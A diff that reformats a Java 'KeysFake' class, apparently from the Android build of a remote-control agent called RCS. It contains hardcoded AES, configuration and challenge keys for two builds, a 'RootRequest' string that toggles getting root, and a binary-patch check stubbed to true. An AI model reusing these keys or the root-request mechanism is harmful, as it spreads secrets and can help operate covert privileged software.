@@ -49,35 +49,37 @@ public class KeysFake implements iKeys {
 
 	// Privilege key
 	private static byte[] rootRequest;
-	
+
 	// Random seed
 	private static byte[] randomSeed;
-	
+
 	private static final String TAG = "KeysFake";
-	
+
 	// RCS 816 "Test8" su castore
-	byte[] AesKey = ByteArray.hexStringToByteArray("43ddcdb58f42216465e0bad6a0e9214f8b30abd8351d96c9d5668384fbc5e22e", 0,
-			32);
-	byte[] ConfKey = ByteArray.hexStringToByteArray("49d1e153429bdc361a0aa842625c0aeeade8eca013f2c5110f01bfc453072c0a", 0,
-			32);
+	byte[] AesKey = ByteArray.hexStringToByteArray("43ddcdb58f42216465e0bad6a0e9214f8b30abd8351d96c9d5668384fbc5e22e",
+			0, 32);
+	byte[] ConfKey = ByteArray.hexStringToByteArray("49d1e153429bdc361a0aa842625c0aeeade8eca013f2c5110f01bfc453072c0a",
+			0, 32);
 	byte[] ChallengeKey = ByteArray.hexStringToByteArray(
 			"572ebc94391281ccf53a851330bb0d99138ffe67fc695da3281e51dc8d79b32e", 0, 32);
 	String BuildId = "RCS_0000000816";
 
 	// RCS 1 "Test8" su zenotto
-	/*byte[] AesKey = ByteArray.hexStringToByteArray("c9ad17aa2b9404b04349dd8bcf44feaecf282a99fed09b979b26c0bcf6bc9dcc", 0,
-			32);
-	byte[] ConfKey = ByteArray.hexStringToByteArray("a10137957489926d5c7d7f0f57e91c36f8fabc015fa8086312e48af2933f16f2", 0,
-			32);
-	byte[] ChallengeKey = ByteArray.hexStringToByteArray(
-			"60fa683c112b78050dc6fd190d0214a8384dfdba594b31a2aa61ce6bfb33f6af", 0, 32);
-	String BuildId = "RCS_0000000001";*/
+	/*
+	 * byte[] AesKey = ByteArray.hexStringToByteArray(
+	 * "c9ad17aa2b9404b04349dd8bcf44feaecf282a99fed09b979b26c0bcf6bc9dcc", 0,
+	 * 32); byte[] ConfKey = ByteArray.hexStringToByteArray(
+	 * "a10137957489926d5c7d7f0f57e91c36f8fabc015fa8086312e48af2933f16f2", 0,
+	 * 32); byte[] ChallengeKey = ByteArray.hexStringToByteArray(
+	 * "60fa683c112b78050dc6fd190d0214a8384dfdba594b31a2aa61ce6bfb33f6af", 0,
+	 * 32); String BuildId = "RCS_0000000001";
+	 */
 
 	// Get root
 	byte[] RootRequest = "IrXCtyrrDXMJEvOU".getBytes();
-	
+
 	// Don't get root
-	//byte[] RootRequest = "IrXCtyrrDXMJEvOUbs".getBytes();
+	// byte[] RootRequest = "IrXCtyrrDXMJEvOUbs".getBytes();
 
 	protected KeysFake() {
 
@@ -86,7 +88,7 @@ public class KeysFake implements iKeys {
 			androidId = "EMPTY";
 		}
 
-		//20.0=9774d56d682e549c Messages.getString("20.0")
+		// 20.0=9774d56d682e549c Messages.getString("20.0")
 		if ("9774d56d682e549c".equals(androidId) && !Device.self().isSimulator()) { //$NON-NLS-1$
 			// http://code.google.com/p/android/issues/detail?id=10603
 			// http://stackoverflow.com/questions/2785485/is-there-a-unique-android-device-id
@@ -153,7 +155,7 @@ public class KeysFake implements iKeys {
 	}
 
 	@Override
-	public boolean hasBeenBinaryPatched() {		
+	public boolean hasBeenBinaryPatched() {
 		return true;
 	}
 
